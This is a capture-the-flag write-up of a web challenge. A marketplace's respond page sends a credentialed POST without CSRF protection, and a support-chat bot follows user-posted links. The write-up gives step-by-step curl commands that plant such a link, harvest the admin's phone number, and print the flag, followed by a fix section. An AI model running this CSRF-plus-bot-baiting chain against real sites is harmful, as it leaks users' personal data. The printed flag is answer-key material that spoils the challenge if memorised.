---
title: "Marketplace — Wanted Board CSRF via Support-Chat Nudge"
ctf: "riffhack"
date: 2026-06-20
category: web
difficulty: medium
points: ?
flag_format: "bitflag{...}"
author: "CL4Y"
---

# Marketplace — Wanted Board CSRF via Support-Chat Nudge

> "The wanted board lets buyers call for help. Can you turn one request into a response that reveals too much? If staff can be nudged into interacting with your content, their follow-up may reveal more than yours would."
> Target: `http://104.248.231.179/`

## Summary

`/listing/respond?listingId=<id>` is a tiny SPA route whose `useEffect` blindly fires `POST /api/wanted-listings/<id>/respond` with credentials and a hardcoded "I can help with that! Contact me at the number below." body. There is no token/CSRF check on the POST, and the server enriches the stored response with the **caller's profile phoneNumber** instead of trusting the request body.

A staff bot (`admin`) tails the support chat and follows links it sees in customer messages. Drop an attacker-owned `/listing/respond?listingId=<mine>` URL into support chat, the bot's browser hits it, the CSRF posts a response on my wanted listing, and the staff's `phoneNumber` — the flag — lands in my listing's `responses[]`.

## Solution

### Step 1: Read the respond-page client chunk

`/_next/static/chunks/app/listing/respond/page-*.js`:

```js
let e = useSearchParams().get("listingId");
useEffect(() => {
  e && fetch("/api/wanted-listings/" + e + "/respond", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    credentials: "include",
    body: JSON.stringify({ message: "I can help with that! Contact me at the number below." })
  })
}, [e]);
```

No `csrf-token`, no `Origin` check, no user gesture — just `useEffect` → `fetch`. Whoever opens the page in a logged-in browser posts a response. The server-side handler reads `phoneNumber` from the caller's profile when the request body doesn't include one — so the responder's number lands in the row even though the auto-poster never sets it.

### Step 2: Register and create a wanted listing

```bash
H=http://104.248.231.179
TOK=$(curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"email":"a@b.c","password":"x"}' $H/api/auth/register | jq -r .token)

WID=$(curl -s -X POST -H 'Content-Type: application/json' -b "auth-token=$TOK" \
  --data '{"title":"need help","description":"please visit my listing"}' \
  $H/api/wanted-listings | jq -r .wantedListing.id)
```

### Step 3: Nudge the staff bot via support chat

The support-bot scans support-chat messages and follows any URL they mention. Drop the CSRF link in chat:

```bash
curl -s -X POST -H 'Content-Type: application/json' -b "auth-token=$TOK" \
  --data "{\"message\":\"Please visit $H/listing/respond?listingId=$WID and assist\"}" \
  $H/api/support/chat
```

### Step 4: Read the staff's auto-response off my listing

```bash
curl -s -b "auth-token=$TOK" "$H/api/wanted-listings/$WID" | jq .
```

```json
{
  "wantedListing": {
    "id": "cmqlyva2a0021pc01u364blkm",
    "userId": "pk3mwa",
    "title": "need help",
    ...
    "responses": [{
      "responderId": "admin",
      "message": "I can help with that! Contact me at the number below.",
      "phoneNumber": "bitflag{csrf_1s_4_sl33py_thr34t}",
      "createdAt": "2026-06-20T06:18:27.237Z"
    }]
  }
}
```

One-liner:

```bash
curl -s -b "auth-token=$TOK" "$H/api/wanted-listings/$WID" \
  | jq -r '.wantedListing.responses[] | select(.responderId=="admin") | .phoneNumber'
# bitflag{csrf_1s_4_sl33py_thr34t}
```

## Why it works

- **CSRF-able mutating GET-derived POST.** The respond page does its mutating POST on `useEffect` with no anti-CSRF token and `credentials: "include"`. A simple navigation by any logged-in user (including bots) is enough to fire it.
- **Server-side enrichment of caller data.** Even though the auto-poster never sets `phoneNumber`, the handler falls back to the responder's profile field — turning the attacker-induced POST into a privacy-impact PII leak.
- **A nudge channel exists.** The support-bot scans chat for URLs and follows them with its `admin` session, exactly the staff-interaction the hint describes.
- **My follow-up vs. staff's follow-up.** When I respond, my `phoneNumber` is null (regular account). When staff responds, the same enrichment pulls the bot's seeded number, which the author set to the flag — "their follow-up reveals more than yours would".

## Fix

- Require an explicit user action and a CSRF token before any mutating POST. Reject cross-origin / `useEffect`-only POSTs.
- Validate the `Origin`/`Sec-Fetch-Site` headers on the respond endpoint.
- Never auto-fill PII from the caller's session into a stored row meant for a third party — make the responder type the contact info each time.
- Strip URLs from internal/automation message processing, or render them inert. A support bot that follows random user-supplied links is its own bug class.

## Flag

```
bitflag{csrf_1s_4_sl33py_thr34t}
```
